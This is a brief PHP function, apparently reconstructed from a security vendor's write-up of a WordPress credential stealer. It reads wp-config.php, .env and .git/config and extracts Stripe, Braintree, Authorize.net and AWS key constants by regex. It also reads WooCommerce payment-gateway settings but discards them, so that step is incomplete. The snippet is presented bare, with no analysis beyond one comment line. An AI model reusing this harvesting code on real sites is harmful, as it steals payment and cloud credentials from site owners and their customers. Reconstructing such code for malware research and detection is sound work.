// Reconstruction of the credential collector in Wordfence's write-up (2026-09).
function cmok60d1b827y0twh() {
	$found = array();
	foreach (array(ABSPATH . 'wp-config.php', ABSPATH . '.env', ABSPATH . '.git/config') as $file) {
		$text = @file_get_contents($file);
		if (!$text) continue;
		if (preg_match_all('#define\s*\(\s*[\'"]([A-Z_]*(?:STRIPE|BRAINTREE|AUTHORIZE|AUTHNET|AWS)[A-Z_]*)[\'"]\s*,\s*[\'"](.+?)[\'"]\s*\)#', $text, $m, PREG_SET_ORDER)) {
			foreach ($m as $hit) { $found[$hit[1]] = $hit[2]; }
		}
	}
	foreach (array('woocommerce_stripe_settings', 'woocommerce_braintree_settings') as $option) {
		$settings = get_option($option, array());
	}
	return $found;
}
